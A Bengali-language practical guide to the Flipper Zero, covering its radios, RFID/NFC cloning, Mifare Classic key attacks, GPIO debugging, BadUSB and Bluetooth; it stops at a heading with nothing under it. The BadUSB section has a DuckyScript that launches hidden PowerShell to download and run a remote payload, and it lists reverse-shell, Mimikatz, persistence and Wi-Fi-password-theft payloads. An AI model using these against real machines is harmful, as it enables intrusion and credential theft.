**Flipper Zero** হাতে-কলমে নিরাপত্তা গবেষকদের মধ্যে সবচেয়ে পরিচিত বহুমুখী যন্ত্র। এটি পকেটে রাখা যায়, দাম প্রায় 170 ডলার, আর এতে রয়েছে সাব-জিগাহার্টজ রেডিও, 125 কিলোহার্টজ আরএফআইডি রিডার, এনএফসি অ্যান্টেনা, ইনফ্রারেড ট্রান্সসিভার, iButton পোর্ট, ব্লুটুথ রেডিও, জিপিআইও এক্সপ্যানশন হেডার ও ইউএসবি পোর্ট। ছোট যন্ত্রটি চাবির রিংয়েও লাগানো যায়। বাক্স খোলা থেকে শুরু করে উন্নত রেড-টিম অনুশীলন কাজ পর্যন্ত এর ক্ষমতা এই নির্দেশিকায় ব্যাখ্যা করা হয়েছে।

*Flipper Zero-তে নতুন হলে বিভাগগুলো ক্রমানুসারে পড়ুন। আগে থেকেই ব্যবহার করলে নির্দিষ্ট উপব্যবস্থার বিভাগে যান।*

## হার্ডওয়্যারের পরিচিতি

**Flipper Zero**-তে STM32WB55 মাইক্রোকন্ট্রোলার রয়েছে। এটি দুই কোরের Arm Cortex-M4 / Cortex-M0+ চিপ, যার সঙ্গে ব্লুটুথ 5.0 রেডিও যুক্ত। মূল অ্যাপ্লিকেশন M4 কোরে সর্বোচ্চ 64 মেগাহার্টজ-এ চলে। M0+ কোর ব্লুটুথ স্ট্যাক পরিচালনা করে।

| উপাদান | বিবরণ |
|---|---|
| **MCU** | STM32WB55RGV6, 64 মেগাহার্টজ-এ Cortex-M4 + Cortex-M0+ |
| **ফ্ল্যাশ** | 1 MB অভ্যন্তরীণ + 256 Mbit বাহ্যিক এসপিআই NOR |
| **RAM** | 256 KB SRAM |
| **ডিসপ্লে** | 1.4-ইঞ্চি ই-পেপার (128x64), সর্বদা চালু |
| **সাব-জিগাহার্টজ রেডিও** | CC1101 ট্রান্সসিভার, 300–928 মেগাহার্টজ |
| **আরএফআইডি** | 125 কিলোহার্টজ অ্যানালগ ফ্রন্ট-এন্ড (EM4100, এইচআইডি, Indala ইত্যাদি) |
| **এনএফসি** | ST25R3916B, 13.56 মেগাহার্টজ ISO 14443A/B, 15693 |
| **ইনফ্রারেড** | 940 nm ট্রান্সমিট এলইডি + TSOP75338 রিসিভ সেন্সর |
| **iButton** | 1-Wire ইন্টারফেস, DS1990A ও স্পর্শ-স্মৃতি চাবি |
| **ব্লুটুথ** | বিএলই 5.0 (STM32WB55-এ সমন্বিত) |
| **জিপিআইও** | 18-পিন হেডার: এসপিআই, আই২সি, ইউএআরটি, 5V/3.3V পাওয়ার, ADC |
| **ইউএসবি** | ইউএসবি-C, এইচআইডি ডিভাইস সমর্থন (BadUSB / ইউ২এফ) |
| **ব্যাটারি** | 2000 মিলিঅ্যাম্পিয়ার-ঘণ্টা লিথিয়াম-পলিমার, ইউএসবি-C চার্জিং, সাধারণ ব্যবহারে প্রায় 30 ঘণ্টা |
| **MicroSD** | সর্বোচ্চ 128 GB, FAT32 বা exFAT |

**ই-পেপার ডিসপ্লে** স্থির ছবি দেখানোর সময় বিদ্যুৎ ব্যবহার করে না। তাই দীর্ঘক্ষণ অপেক্ষমাণ অবস্থায় ব্যাটারি টেকে।

**CC1101** হলো Texas Instruments-এর সাধারণ ব্যবহারের সাব-জিগাহার্টজ ট্রান্সসিভার চিপ। এটি 300–348 মেগাহার্টজ, 387–464 মেগাহার্টজ এবং 779–928 মেগাহার্টজ রেঞ্জে কাজ করে। প্রোগ্রাম করা যায় বলে সাব-জিগাহার্টজ মডিউলটি নমনীয়।

## ফার্মওয়্যারের বিকল্প

আপনি **Flipper Zero-র অফিসিয়াল ফার্মওয়্যার** অথবা জনপ্রিয় কমিউনিটি শাখা ব্যবহার করতে পারেন। নিয়মনীতি ও আইনি কারণে Flipper যন্ত্র যে ফিচার সীমিত রাখে, কিছু শাখা সেগুলো চালু করে।

| ফার্মওয়্যার | বিবরণ | প্রধান সুবিধা |
|---|---|---|
| **সরকারি** | Flipper যন্ত্র-এর মূল ফার্মওয়্যার | সংযত ও নিরাপদ প্রাথমিক সেটিং |
| **Unleashed** | জনপ্রিয় শাখা, স্থিতিশীলতায় জোর | সব সাব-জিগাহার্টজ ফ্রিকোয়েন্সি, অতিরিক্ত প্রোটোকল |
| **Xtreme** | অনেক ফিচার, সক্রিয় রক্ষণাবেক্ষণ | কাস্টম UI, অতিরিক্ত অ্যাপ ও সাব-জিগাহার্টজ সুবিধা |
| **RogueMaster** | তৃতীয় পক্ষের অনেক অ্যাপসহ | শুরু থেকেই বড় অ্যাপ প্যাকেজ |

জানালা, macOS বা Linux-এ **qFlipper ডেস্কটপ অ্যাপ** দিয়ে যেকোনো শাখা ফ্ল্যাশ করুন। চাইলে `.dfu` ফাইল SD কার্ডে কপি করে ডিভাইসের হালনাগাদ মেনু ব্যবহার করুন।

*গবেষণার শুরুতে Unleashed একটি সংযত পছন্দ। বেশি ফিচার চাইলে অনেকেই Xtreme বেছে নেন। ভ্রমণের সময় আইনি জটিলতা কমাতে অফিসিয়াল ফার্মওয়্যার ব্যবহার করুন।*

## সাব-জিগাহার্টজ রেডিও

সাব-গিগাহার্টজ মডিউলটি সবচেয়ে আলোচিত বৈশিষ্ট্যগুলোর একটি। গ্যারেজের দরজা, গাড়ির রিমোট, দরজার ঘণ্টা, আবহাওয়া স্টেশন, বেতার বিদ্যুৎ-সকেট এবং আরও অনেক ডিভাইস যে কম্পাঙ্ক ব্যবহার করে, সেই কম্পাঙ্কে সংকেত ধারণ, বিশ্লেষণ, পুনঃপ্রেরণ ও সম্প্রচার করতে পারে।

### সমর্থিত ফ্রিকোয়েন্সি রেঞ্জ

- **300–348 মেগাহার্টজ** — পুরোনো রিমোট এবং যুক্তরাষ্ট্রের কিছু গ্যারেজ দরজা
- **387–464 মেগাহার্টজ** — ইউরোপ ও যুক্তরাষ্ট্রের ডিভাইস; 433.92 মেগাহার্টজ বহুল ব্যবহৃত বৈশ্বিক আইএসএম ব্যান্ড
- **779–928 মেগাহার্টজ** — 868 মেগাহার্টজ (ইউরোপ), 915 মেগাহার্টজ (যুক্তরাষ্ট্রের আইএসএম), 868 মেগাহার্টজ LoRa

### প্রচলিত মডুলেশন পদ্ধতি

| মড্যুলেশন | অর্থ |
|---|---|
| **AM (ASK/OOK)** | প্রশস্ততা-স্থানান্তর পদ্ধতি; সহজ চালু/বন্ধ সংকেত, অধিকাংশ সাধারণ দূরনিয়ন্ত্রণ যন্ত্রে ব্যবহৃত। |
| **FM (FSK/2-FSK)** | কম্পাঙ্ক স্থানান্তর কীং; আবহাওয়া পর্যবেক্ষণ কেন্দ্র ও কিছু গাড়ির দূরনিয়ন্ত্রণ যন্ত্রে ব্যবহৃত। |
| **APSK** | সমন্বিত মড্যুলেশন-পদ্ধতি; অল্প কয়েকটি স্মার্ট যন্ত্রে ব্যবহৃত। |

Flipper কাঁচা OOK সংকেত স্বয়ংক্রিয়ভাবে পাঠোদ্ধার করে। পর্দায় সংকেত দেখায় এবং এক বোতামেই আবার পাঠাতে দেয়। যেসব যন্ত্র পরিবর্তনশীল কোড ব্যবহার করে না, সেগুলোর **স্থির কোডের সংকেত পুনঃপ্রেরণ** সহজ।

### রোলিং কোড ও স্থির কোড

**স্থির-কোড** যন্ত্র প্রতিবার একই সংকেত পাঠায়। Flipper Zero একবার সংকেতটি ধারণ করে পরে আবার পাঠাতে পারে। অনেক সস্তা বেতার বিদ্যুৎ-সকেট, দরজার ঘণ্টি এবং পুরোনো গ্যারেজের দরজা স্থির কোড ব্যবহার করে।

**পরিবর্তনশীল-কোড** যন্ত্র (KeeLoq, AUT64 ইত্যাদি) প্রতিবার ব্যবহারের পর কোড বদলায়। ধারণ করা সংকেত সরাসরি আবার পাঠানো যায় না। এমন ব্যবস্থার পরীক্ষা জটিল, এতে বিশেষ সরঞ্জাম ও কাছাকাছি সময়ে সংকেত গ্রহণ দরকার। সাধারণ অবস্থায় Flipper Zero আধুনিক পরিবর্তনশীল কোড ভাঙতে পারে না।

*নিজের যন্ত্রেই পরীক্ষা করুন। বাড়ির স্থির-কোড যন্ত্রগুলো শেখার ভালো উদাহরণ।*

### সাব-জিগাহার্টজ ব্যবহারের ধাপ

1. মূল মেনু থেকে **সাব-জিগাহার্টজ** খুলুন।
2. সংকেত ধরতে **Read** (সংকেত পড়ুন) বেছে নিন। যন্ত্রটি দূরনিয়ন্ত্রণ যন্ত্রের দিকে তাক করে তার বোতাম চাপুন।
3. Flipper কম্পাঙ্ক, সংকেতের মডুলেশন-পদ্ধতি ও কাঁচা বিটের বিন্যাস দেখাবে।
4. SD কার্ডে সংরক্ষণ করতে **Save** (সংরক্ষণ করুন) চাপুন।
5. আবার পাঠাতে **Send** (আবার পাঠান) চাপুন অথবা পরে সংরক্ষিত ফাইলটি খুলুন।

**Frequency Analyzer** (কম্পাঙ্ক বিশ্লেষক) নিষ্ক্রিয়ভাবে কম্পাঙ্কের বর্ণালী স্ক্যান করে সক্রিয় কম্পাঙ্ক দেখায়। অজানা সংকেত-প্রেরক শনাক্তে এটি কাজে লাগে।

### ব্রুট-ফোর্স পরীক্ষা

সম্ভাব্য চাবির মানের সংখ্যা কম এমন প্রোটোকলে (যেমন পুরোনো দূরনিয়ন্ত্রণ যন্ত্রের 12-বিট বা 24-বিট স্থির কোড) Flipper **একে একে সব কোড পরীক্ষা** করতে পারে। খুব পুরোনো বা সস্তা যন্ত্রে এটি কার্যকর হতে পারে, কিন্তু পরিবর্তনশীল কোড বা বড় চাবির পরিসরের ক্ষেত্রে নয়।

কাস্টম ফার্মওয়্যারে অতিরিক্ত সম্ভাব্য-কোডের তালিকা এবং কিছু নির্মাতার জন্য নির্দিষ্ট পরীক্ষার ধারা থাকে। প্রচলিত ধারাগুলোর নাম **Came 12bit**, **Nice 12bit**, **Linear 8bit** এবং **Holtek 12bit**।

## আরএফআইডি (125 কিলোহার্টজ নিম্ন কম্পাঙ্ক)

**125 kHz RFID** মডিউলটি নিম্ন-কম্পাঙ্কের নৈকট্য কার্ড পড়ে ও লেখে। এই কার্ড ও চাবির ট্যাগ পুরোনো প্রবেশ-নিয়ন্ত্রণ ব্যবস্থা, প্রাণীর মাইক্রোচিপ ট্যাগ এবং শিল্পক্ষেত্রে সম্পদের অবস্থান শনাক্ত করতে ব্যবহৃত হয়।

### সমর্থিত কার্ডের ধরন

| কার্ড | বিবরণ |
|---|---|
| **EM4100 / EM4102** | সবচেয়ে প্রচলিত; 64-বিট, শুধু পড়া যায়; সস্তা প্রবেশাধিকার ব্যবস্থা-এ থাকে। |
| **এইচআইডি Prox** | বাণিজ্যিক প্রবেশাধিকার নিয়ন্ত্রণ-এ জনপ্রিয় (এইচআইডি Global H10301 ও অন্যান্য রূপভেদ)। |
| **Indala Prox** | পুরোনো Motorola / Indala বিন্যাস। |
| **IoProx** | Kantech IoProx; উত্তর আমেরিকার বাণিজ্যিক ভবনেও প্রচলিত। |
| **FDX-B (ISO 11784/11785)** | প্রাণীর মাইক্রোচিপের মান। |
| **Pyramid** | Farpointe তথ্য; Indala-র অনুরূপ। |
| **Viking** | তুলনামূলক কম প্রচলিত; কিছু ইউরোপীয় ব্যবস্থা-এ আছে। |

### LF কার্ড পড়া

অ্যান্টেনা থাকা Flipper-এর ওপরের ধারটি কার্ড বা চাবির ট্যাগ থেকে কয়েক সেন্টিমিটার দূরে রাখুন। **125 kHz RFID > Read** (কার্ড পড়ার পথ) মেনু খুলুন। Read (পড়ুন) বিকল্পটি LF কার্ড পড়ে তার ID দেখায়। এক থেকে দুই সেকেন্ডের মধ্যে যন্ত্রটি ID পড়ে প্রতিষ্ঠানের কোড ও কার্ড নম্বর দেখায়।

### অনুকরণ ও ক্লোন করা

কার্ডটি পড়ার পর ফাইলে সংরক্ষণ করুন। পরে সেই ফাইল বেছে বোতাম চাপলে Flipper কার্ডটির **অনুকরণ করে**। এটি কার্ডের ID পাঠায়, ফলে পাঠক কার্ডটিকে আসল বলে শনাক্ত করে।

খালি T5577 লেখার উপযোগী কার্ডে ID-ও **লেখা** যায়। এসব কার্ডের দাম প্রায় $0.50 এবং এগুলো অধিকাংশ নিম্ন-কম্পাঙ্কের বিন্যাস সমর্থন করে।

*নিজের নয় বা পরীক্ষা করার অনুমতি নেই এমন প্রবেশ-কার্ড নকল করা অধিকাংশ অঞ্চলে অপরাধ। প্রবেশ-নিয়ন্ত্রণ ব্যবস্থা পরীক্ষা করার আগে লিখিত অনুমতি নিন.*

### LF আরএফআইডি-এর সীমাবদ্ধতা

নিম্ন-কম্পাঙ্ক আরএফআইডি-তে ক্রিপ্টোগ্রাফিক সুরক্ষা নেই। কাছাকাছি পাঠক থাকা যে কেউ কার্ডের ID পড়তে পারে। আধুনিক শারীরিক নিরাপত্তায় পারস্পরিক প্রমাণীকরণসহ 13.56 মেগাহার্টজ এনএফসি স্মার্ট কার্ড ব্যবহার করা হয়।

## এনএফসি (13.56 মেগাহার্টজ উচ্চ কম্পাঙ্ক)

**এনএফসি মডিউল**-এ ST25R3916B চিপ আছে এবং এটি ISO 14443A, ISO 14443B ও ISO 15693 সমর্থন করে। যোগাযোগবিহীন পেমেন্ট, গণপরিবহন, ভবনের প্রবেশ-নিয়ন্ত্রণ স্মার্ট কার্ড ও এনএফসি ট্যাগে এই কম্পাঙ্ক ব্যবহৃত হয়।

### সমর্থিত মান

| মান | প্রচলিত ব্যবহার |
|---|---|
| **ISO 14443A** | Mifare Classic, Mifare DESfire, NXP NTAG, ক্রেডিট/ডেবিট কার্ড |
| **ISO 14443B** | কিছু সরকারি পরিচয়পত্র ও পাসপোর্টের বাইরের স্তর |
| **ISO 15693** | গ্রন্থাগারের ট্যাগ ও কিছু শিল্পক্ষেত্রের আরএফআইডি |
| **EMV (স্তর ১)** | কন্ট্যাক্টলেস পেমেন্ট কার্ডের কেবল পঠনযোগ্য তথ্য |
| **এনএফসি-A/B/F/V** (এনএফসি-তে তথ্য বিনিময়ের মানদণ্ড) | এনএফসি-তে সাধারণ তথ্য বিনিময়ের প্রোটোকল |

### Mifare Classic-এর আক্রমণ

**Mifare Classic** 13.56 মেগাহার্টজ স্মার্ট-কার্ড মান; 2008 সালে এর দুর্বলতা তাত্ত্বিকভাবে দেখানো হয়। পুরোনো গণপরিবহন ও ভবনের প্রবেশ-নিয়ন্ত্রণ ব্যবস্থায় এখনও এটি ব্যবহৃত হয়। Flipper Zero-তে কয়েকটি পরীক্ষা আছে:

- **Read** (পড়ুন) — কারখানার নির্ধারিত চাবি (`FFFFFFFFFFFF` বা `A0A1A2A3A4A5`) থাকা সেক্টর পড়ে।
- **অভিধান আক্রমণ** — সুরক্ষিত সেক্টরে পরিচিত চাবির তালিকা পরীক্ষা করে; কাস্টম ফার্মওয়্যারে বড় তালিকা থাকে।
- **নেস্টেড আক্রমণ** — অন্তত একটি সেক্টরের চাবি জানা থাকতে হয়; সময়ভিত্তিক ক্রিপ্টবিশ্লেষণ করে আরও চাবি বের করে।
- **Darkside আক্রমণ** — Mifare Classic-এর কিছু সংস্করণে কোনো জানা চাবি ছাড়াও কাজ করে। Flipper-কে কার্ডের এক সেন্টিমিটারের মধ্যে রাখতে হয়।

সব সেক্টর পড়ার পর সম্পূর্ণ ডাম্প সংরক্ষণ করে কার্ডটির **অনুকরণ** করা যায়। এতে সেক্টরের তথ্যও থাকে।

*যাতায়াতের ভাড়া বা পার্কিংয়ের ক্রেডিট থাকা Mifare Classic কার্ড নকল করবেন না, যদি না কার্ড ও তার পেছনের ব্যবস্থা দুটিই আপনার নিয়ন্ত্রণে থাকে.*

### Mifare DESfire ও আধুনিক কার্ড

**Mifare DESfire EV1/EV2/EV3** কার্ড AES-128 এনক্রিপশন ও পারস্পরিক প্রমাণীকরণ ব্যবহার করে। Flipper Zero সুরক্ষিত তথ্য পড়তে পারে না। UID ও AID তালিকা পড়লেও সঠিক চাবি ছাড়া অ্যাপ্লিকেশনের তথ্য পাওয়া যায় না। এটিই নকশার উদ্দেশ্য; DESfire নিরাপদ।

**EMV পেমেন্ট কার্ড** — যোগাযোগবিহীন Visa, Mastercard ও Amex — কিছু প্রকাশ্য পরিচিতিমূলক তথ্য দেখাতে পারে (পুরোনো কার্ডে কার্ড নম্বর, মেয়াদ শেষের তারিখ ও লেনদেনের তালিকা)। আধুনিক কার্ড সাধারণভাবে পড়লে কম তথ্য দেয়। Flipper প্রকৃত পেমেন্ট লেনদেন শুরু করতে বা তাতে আড়ি পাততে পারে না।

### এনএফসি ট্যাগ ও NDEF

**NDEF (NFC-তে তথ্য বিনিময়ের বিন্যাস)** হলো বিপণন, পণ্য-প্রমাণীকরণ এবং স্মার্ট লেবেলে ব্যবহৃত NFC ট্যাগের মানক বিন্যাস। Flipper NDEF ট্যাগ পড়তে, সংরক্ষণ করতে, লিখতে ও অনুকরণ করতে পারে। এটি কাজে লাগে:

- অনুমোদিত পরীক্ষায় NXP NTAG203 বা NTAG213 ট্যাগ নকল করতে
- নিজস্ব NDEF পেলোড (URL, যোগাযোগের কার্ড বা Wi-Fi পরিচয়-তথ্য) লেখা
- ভৌত ট্যাগ ছাড়াই ফোনে কোনো কাজ চালু হয় কি না যাচাই করতে ট্যাগের অনুকরণ করতে

## ইনফ্রারেড (IR)

ইনফ্রারেড মডিউলে 940 nm প্রেরণকারী এলইডি ও TSOP75338 গ্রহণকারী ডিমডুলেটর রয়েছে। এটি প্রায় সব ভোক্তা-ইলেকট্রনিকসের ইনফ্রারেড দূরনিয়ন্ত্রণ প্রোটোকল সমর্থন করে।

### সমর্থিত প্রোটোকল (ডিকোড করা)

| প্রোটোকল | প্রচলিত ডিভাইস |
|---|---|
| **NEC** | সবচেয়ে প্রচলিত; LG, Samsung, Panasonic ও অন্যরা |
| **RC5** | Philips ডিভাইস |
| **RC6** | Philips, Microsoft ও কেবল টিভি সেট-টপ বক্স |
| **Samsung32** | Samsung TV ও হোম থিয়েটার |
| **NECext** | 32-বিট ঠিকানাসহ বিস্তৃত NEC |
| **SIRC12 / SIRC15 / SIRC20** | Sony ডিভাইস |
| **Kaseikyo** | Panasonic, JVC |
| **আরসিএ** | আরসিএ ব্র্যান্ড রিমোট |

যে প্রোটোকলটি ব্যাখ্যা করা যায় না, তার **কাঁচা ইনফ্রারেড সংকেত**ও ধারণ ও পুনঃপ্রেরণ করা যায়। এতে স্পন্দন ও বিরতির সঠিক সময় বজায় থাকে।

### সর্বজনীন রিমোট

অন্তর্নির্মিত **Universal Remotes** অ্যাপে ব্র্যান্ড ও যন্ত্রের শ্রেণি অনুযায়ী ইনফ্রারেড কোড রয়েছে। শারীরিক রিমোট ছাড়াই টিভি বন্ধ, সাউন্ডবারের শব্দের মাত্রা বদলানো বা শীতাতপ-নিয়ন্ত্রণ যন্ত্র চালানো যায়। GitHub-এর কমিউনিটি ইনফ্রারেড কোড-সংগ্রহে (flipperzero-ir-relay) আরও হাজারো কোড রয়েছে।

*রেড-টিম অনুশীলন বা মানুষকে কৌশলে প্রভাবিত করার অনুশীলনে, দৃশ্যমান পর্দা থাকা স্থানে ইনফ্রারেড রিমোট মনোযোগ সরাতে পারে।*

### নিজের রিমোট ধারণ করা

1. **Infrared > Learn New Remote** (ইনফ্রারেড > নতুন রিমোট শেখা) খুলুন।
2. আসল রিমোট-টি Flipper-এর ওপরের ইনফ্রারেড গ্রাহক জানালা-র দিকে ধরুন।
3. যে বোতাম ধারণ করবেন সেটি চাপুন; Flipper প্রতিটি বোতাম আলাদাভাবে সংরক্ষণ করে।
4. রিমোট ফাইল-এর নাম দিয়ে সংরক্ষণ করুন।
5. সংরক্ষিত ফাইল থেকে পছন্দের বোতামের সংকেত পুনঃপ্রেরণ করুন।

## iButton ও 1-Wire

**iButton** (Dallas/Maxim 1-Wire) হলো স্পর্শ-ভিত্তিক প্রোটোকল, যা কিছু শারীরিক প্রবেশ-নিয়ন্ত্রণ ব্যবস্থা, সম্পদ অনুসরণ এবং তাপমাত্রা মাপার কাজে ব্যবহৃত হয়। iButton হলো ছোট ধাতব চাকতি বা নলাকার অংশ, যা পাঠকের সংস্পর্শে আনা হয়।

| **DS1990A** | প্রচলিত প্রবেশাধিকার চাবি; 64-বিট অনন্য ID, শুধু-পাঠযোগ্য |

## জিপিআইও ও হার্ডওয়্যার হ্যাকিং

Flipper Zero-র ওপরের **18-পিন জিপিআইও হেডার** হার্ডওয়্যার প্রকল্পের প্রধান সংযোগ-মাধ্যম। এতে এসপিআই, আই২সি, ইউএআরটি, ADC ও বিদ্যুৎ-সরবরাহের লাইন রয়েছে।

### ইউএআরটি কনসোল অ্যাক্সেস

অনেক এমবেডেড যন্ত্রে উৎপাদনের সময়ও UART ডিবাগ কনসোল চালু থাকে। Flipper-এর UART পিন লক্ষ্য যন্ত্রের UART TX/RX-এ যুক্ত করলে সিরিয়াল কনসোলে প্রবেশ করা যায়, এবং সম্ভাব্যভাবে:

- উচ্চ-অধিকারযুক্ত শেল খোলা
- বুট-লগে থাকা পরিচয়-তথ্য ও সিস্টেমের তথ্য দেখা
- বুটলোডার মেনু থাকলে স্বাক্ষরহীন ফার্মওয়্যার স্থাপন

**GPIO > USB-UART Bridge** (জিপিআইও মেনু থেকে ইউএসবি-সিরিয়াল সংযোগ) খুলুন, অথবা জিপিআইও অ্যাপ থেকে কমান্ড-টার্মিনাল সংযোগ চালু করুন। যুক্ত কম্পিউটারে Flipper ইউএসবি সিরিয়াল পোর্ট হিসেবে দেখা যায় এবং ইউএআরটি পিনগুলোকে সংযুক্ত করে।

### এসপিআই ও আই২সি সেন্সর

জিপিআইও হেডারে ত্বরণমাত্রা সেন্সর, বায়ুচাপ সেন্সর, তাপমাত্রা ও আর্দ্রতা সেন্সর, বা OLED পর্দার মতো এসপিআই ও আই২সি সেন্সর সরাসরি যুক্ত করুন। প্রচলিত চিপগুলোর জন্য কমিউনিটি অ্যাপ রয়েছে:

- **SSD1306** OLED ডিসপ্লে ড্রাইভার
- **BME280** তাপমাত্রা, আর্দ্রতা ও চাপের সেন্সর
- **NRF24L01** 2.4 গিগাহার্টজ রেডিও মডিউল, যা বেতার আক্রমণ পৃষ্ঠ বাড়ায়
- সাব-জিগাহার্টজ পরিসর বাড়াতে বাইরের **CC1101** অ্যান্টেনা

### জেটিএজি ও এসডব্লিউডি ডিবাগিং

GPIO হেডারের কয়েকটি পিনে SWD সংকেত থাকে। একটি অ্যাডাপ্টার দিয়ে Flipper-কে **JTAG/SWD ডিবাগ প্রোব** হিসেবে ব্যবহার করা যায়:

- লক্ষ্য MCU-র কোড থামানো ও ধাপে ধাপে চালানো
- ফ্ল্যাশ মেমোরি পড়া ও লেখা
- ভোল্টেজে সাময়িক বিচ্যুতি ঘটিয়ে ডিবাগ-প্রবেশাধিকার থেকে লক করা যন্ত্রের ফার্মওয়্যার উদ্ধারের চেষ্টা

এটি উন্নত পর্যায়ের কাজ। Flipper-এর **BlackMagic প্রোব** ফার্মওয়্যার পোর্ট এই পদ্ধতিকে ব্যবহারযোগ্য করে।

## BadUSB ও ইউএসবি এইচআইডি আক্রমণ

ইউএসবি-C দিয়ে কম্পিউটারে লাগালে Flipper Zero **ইউএসবি এইচআইডি কিবোর্ড** হিসেবে শনাক্ত হয়। BadUSB-তে যন্ত্রটি ড্রাইভার স্থাপন না করেই স্বয়ংক্রিয়ভাবে কী-চাপ পাঠায়।

### DuckyScript

Flipper BadUSB স্ক্রিপ্টে **DuckyScript** ব্যবহার করে, যা Hak5-এর ইউএসবি Rubber Ducky-র স্ক্রিপ্ট-ভাষা। স্ক্রিপ্টটি SD কার্ডের `badusb/` ফোল্ডারে সাদামাটা-পাঠ্য ফাইল হিসেবে থাকে।

```
REM রান ডায়ালগ খুলে PowerShell চালু করুন
DELAY 500
GUI r
DELAY 300
STRING powershell -NoP -W Hidden -Exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')"
ENTER
```

BadUSB পেলোড-এর ধরন:

- **বিপরীত শেল** — আক্রমণকারীর কম্পিউটারে নেটওয়ার্ক সংযোগ খোলে
- **পরিচয়-তথ্য ডাম্প** — Mimikatz বা অনুরূপ মেমরির ভেতরে চলা সরঞ্জাম ব্যবহার করে
- **Persistence** (স্থায়ী প্রবেশাধিকার) — চালুর সময় স্বয়ংক্রিয়ভাবে শুরু হওয়ার এন্ট্রি বা নির্ধারিত কাজ যোগ করে
- **ওয়াইফাই পাসওয়ার্ড নিষ্কাশন** — `netsh` দিয়ে সংরক্ষিত বেতার প্রোফাইল রপ্তানি করা
- **SSH চাবি ইনজেকশন** — `authorized_keys`-এ আক্রমণকারীর চাবি যোগ করে

### BadUSB প্রতিরোধ

কম্পিউটার কিবোর্ডকে বিনা যাচাইয়ে বিশ্বাস করে বলে BadUSB কাজ করে। প্রতিরোধের উপায়:

- **USBGuard** (Linux) — নির্মাতা/পণ্যের ID অনুযায়ী নির্দিষ্ট ইউএসবি যন্ত্র অনুমোদিত তালিকায় রাখুন
- **ইউএসবি লকডাউন গোষ্ঠী নীতি** (জানালা) — অনুমোদিত সরবরাহকারীর নয় এমন এইচআইডি যন্ত্র বন্ধ করুন
- **শারীরিক পোর্ট অবরোধক** — উচ্চ-নিরাপত্তা জায়গায় ইউএসবি সংযোগ ঠেকান
- **শেষপ্রান্ত শনাক্তকরণ** — CrowdStrike-এর মতো সমাধান দ্রুত কী-স্ট্রোক প্রবেশ শনাক্ত করতে পারে

### ইউ২এফ হার্ডওয়্যার টোকেন

Flipper Zero **FIDO ইউ২এফ হার্ডওয়্যার নিরাপত্তা চাবি** হিসেবেও কাজ করতে পারে। সরকারি ফার্মওয়্যার-এ ইউ২এফ আছে। GitHub, Google, Cloudflare-সহ FIDO ইউ২এফ সমর্থিত ওয়েবসাইটে Flipper নিবন্ধন করে পেছনের বোতাম ছুঁয়ে প্রমাণীকরণ নিশ্চিত করুন।

এভাবে নিজের অ্যাকাউন্টের হার্ডওয়্যার টোকেন হিসেবেও Flipper ব্যবহার করা যায়। MCU-র সুরক্ষিত সংরক্ষণ-এ ব্যক্তিগত চাবি রাখা হয়।

## ব্লুটুথ

STM32WB55-তে ব্লুটুথ 5.0 রয়েছে। Flipper বিএলই ব্যবহার করে:

- **Flipper Mobile App** — ফাইল পরিচালনা, ফার্মওয়্যার হালনাগাদ ও দূরনিয়ন্ত্রণের জন্য iOS/Android অ্যাপ
- **BadBT** (কমিউনিটি অ্যাপ) — ইউএসবির বদলে ব্লুটুথে DuckyScript-এর কী-চাপ পাঠায়; আগে যুক্ত ব্লুটুথ কম্পিউটারে বেতার এইচআইডি ইনপুট সম্ভব করে
- **বিএলই স্ক্যানার** — কাছাকাছি বিএলই বিজ্ঞাপন নিষ্ক্রিয়ভাবে স্ক্যান করে ভবনের IoT যন্ত্র খুঁজতে সাহায্য করে

খোলা জায়গায় ব্লুটুথ পরিসর প্রায় 10–30 মিটার। লক্ষ্য ওয়ার্কস্টেশন-এর কাছে থলে বা পোশাকের পকেট থেকে বেতারভাবে BadUSB পেলোড পাঠানোর জন্য এই পরিসর যথেষ্ট হতে পারে।

### মোবাইল অ্যাপ জোড়া লাগানো

1. Apple App Store বা Google Play থেকে **Flipper Mobile App** নামিয়ে নিন।
2. Flipper-এ **Settings > Bluetooth > Pair Phone** (Bluetooth দিয়ে ফোন জোড়ার মেনু) খুলুন।
3. অ্যাপ খুলে জোড়া নির্দেশ অনুসরণ করুন।
4. SD কার্ড দেখুন, তালিকা থেকে অ্যাপ স্থাপন করুন এবং সেন্সরের তথ্য নিন।

## নিজস্ব ফার্মওয়্যার বিস্তারিত

### Unleashed ফার্মওয়্যার

**Unleashed** (github.com/DarkFlippers/unleashed-firmware) সবচেয়ে সংযত কমিউনিটি শাখা। এটি সাব-জিগাহার্টজ কম্পাঙ্ক-র ভৌগোলিক সীমা সরায় এবং সরকারি কোডভান্ডার-এর কাছাকাছি থেকে প্রোটোকল সমর্থন বাড়ায়। স্থিতিশীলতাই এর অগ্রাধিকার।

সরকারি ফার্মওয়্যার-এর তুলনায় সংযোজন:

- বিস্তৃত সাব-জিগাহার্টজ পরিসর (300–928 মেগাহার্টজ সীমাহীন)
- অতিরিক্ত সাব-জিগাহার্টজ প্রোটোকল (CAME, Nice, DoorHan ইত্যাদি)
- অতিরিক্ত এনএফসি প্রোটোকল
- বর্ধিত BadUSB DuckyScript সমর্থন
- বড় ইনফ্রারেড ডেটাবেস

### Xtreme ফার্মওয়্যার

**Xtreme** (github.com/Flipper-XFW/Xtreme-Firmware) Unleashed-এর সুবিধার সঙ্গে নিজস্ব সম্পদ-ব্যবস্থা যোগ করে। Flipper-এর নাম, সূচনার পর্দা, ডেস্কটপ অ্যানিমেশন ও এলইডির আচরণ বদলানো যায়। সেটিংস মেনুতেও আরও বিকল্প আছে।

অতিরিক্ত ফিচার:

- নির্বাচিত তৃতীয়-পক্ষের অ্যাপসহ অ্যাপ সংগ্রহকেন্দ্র
- বিস্তৃত সাব-জিগাহার্টজ ও এনএফসি আক্রমণ পেলোড
- RGB এলইডি স্ক্রিপ্টিং
- ফাইল পরিচালনার উন্নতি

### RogueMaster

**RogueMaster** অনেক তৃতীয়-পক্ষের অ্যাপ ও কমিউনিটি সরঞ্জাম একত্র করে; কিছু পরীক্ষামূলক বা নির্দিষ্ট পরিস্থিতিতে ঝুঁকিপূর্ণ। Unleashed বা Xtreme-এর তুলনায় কম স্থিতিশীল, তবে এক ইনস্টলেশনে বেশি সরঞ্জাম দেয়।

- খেলা
- জিপিআইও সেন্সর
- উন্নয়নকারী সরঞ্জাম
- সঙ্গীত ও বিনোদন

## আনুষঙ্গিক ও হার্ডওয়্যার সম্প্রসারণ

### ওয়াইফাই Dev Board

